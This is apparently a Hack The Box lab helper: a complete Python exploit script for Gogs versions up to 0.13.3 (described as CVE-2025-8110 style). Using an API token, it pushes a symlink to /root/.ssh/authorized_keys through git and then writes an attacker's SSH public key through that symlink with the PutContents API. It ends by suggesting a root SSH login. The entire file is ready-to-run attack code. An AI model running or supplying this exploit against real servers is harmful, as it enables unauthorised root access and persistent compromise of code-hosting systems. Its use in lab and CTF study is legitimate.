#!/usr/bin/env python3
"""
Gogs <= 0.13.3 — CVE-2025-8110 style symlink + PutContents write.

Requires an authenticated API token (Settings → Applications).
Plants an SSH public key into a path via symlink (default: /root/.ssh/authorized_keys).

Usage (lab):
  # create token in UI first, or pass existing
  python3 gogs_cve_2025_8110_root.py \\
      --base http://staging-v2-code.dev.silentium.htb \\
      --token <GOGS_TOKEN> \\
      --owner harry --repo pwn \\
      --pubkey ~/.ssh/id_ed25519.pub \\
      --target /root/.ssh/authorized_keys

Needs: git, network to Gogs. Creates repo if missing, pushes symlink via local git.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request
from pathlib import Path


def api(method: str, url: str, token: str, data: dict | None = None):
    body = None if data is None else json.dumps(data).encode()
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read().decode()
            return resp.status, json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, {"raw": raw}


def main() -> int:
    p = argparse.ArgumentParser(description="Gogs CVE-2025-8110 helper (HTB lab)")
    p.add_argument("--base", required=True, help="http://gogs.example")
    p.add_argument("--token", required=True)
    p.add_argument("--owner", required=True, help="Gogs username")
    p.add_argument("--repo", default="pwn")
    p.add_argument("--pubkey", required=True, type=Path)
    p.add_argument("--target", default="/root/.ssh/authorized_keys")
    p.add_argument("--link-name", default="pwnlink")
    args = p.parse_args()
    base = args.base.rstrip("/")
    pub = args.pubkey.read_text().strip() + "\n"
    if not pub.startswith("ssh-"):
        print("[-] pubkey does not look like OpenSSH public key", file=sys.stderr)
        return 1

    # ensure repo
    code, repos = api("GET", f"{base}/api/v1/user/repos", args.token)
    names = [r["name"] for r in repos] if isinstance(repos, list) else []
    if args.repo not in names:
        code, body = api(
            "POST",
            f"{base}/api/v1/user/repos",
            args.token,
            {
                "name": args.repo,
                "private": False,
                "auto_init": True,
                "readme": "Default",
            },
        )
        print(f"[*] create repo → {code}")
        if code not in (200, 201):
            print(body, file=sys.stderr)
            return 1
    else:
        print("[*] repo exists")

    clone = f"{base.replace('http://', f'http://{args.owner}:{args.token}@').replace('https://', f'https://{args.owner}:{args.token}@')}/{args.owner}/{args.repo}.git"

    with tempfile.TemporaryDirectory(prefix="gogs-pwn-") as td:
        td = Path(td)
        subprocess.check_call(["git", "clone", clone, "repo"], cwd=td)
        repo = td / "repo"
        subprocess.check_call(["git", "config", "user.email", f"{args.owner}@lab.local"], cwd=repo)
        subprocess.check_call(["git", "config", "user.name", args.owner], cwd=repo)
        link = repo / args.link_name
        if link.exists() or link.is_symlink():
            link.unlink()
        os.symlink(args.target, link)
        subprocess.check_call(["git", "add", "-f", args.link_name], cwd=repo)
        # commit may be empty if same — allow fail
        c = subprocess.run(
            ["git", "commit", "-m", "symlink"],
            cwd=repo,
            capture_output=True,
            text=True,
        )
        print(c.stdout, c.stderr)
        subprocess.check_call(["git", "push", "origin", "HEAD"], cwd=repo)
        print("[+] symlink pushed")

    # PutContents through symlink
    code, meta = api(
        "GET",
        f"{base}/api/v1/repos/{args.owner}/{args.repo}/contents/{args.link_name}",
        args.token,
    )
    print(f"[*] get link → {code} type={meta.get('type')} target={meta.get('target')}")
    sha = meta.get("sha")
    payload = {
        "message": "write-through",
        "content": base64.b64encode(pub.encode()).decode(),
    }
    if sha:
        payload["sha"] = sha
    code, body = api(
        "PUT",
        f"{base}/api/v1/repos/{args.owner}/{args.repo}/contents/{args.link_name}",
        args.token,
        payload,
    )
    print(f"[*] put contents → {code}")
    if code not in (200, 201):
        print(body, file=sys.stderr)
        return 1
    print("[+] write-through likely succeeded")
    print(f"    try: ssh -i <private_key_for_pubkey> root@<TARGET>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
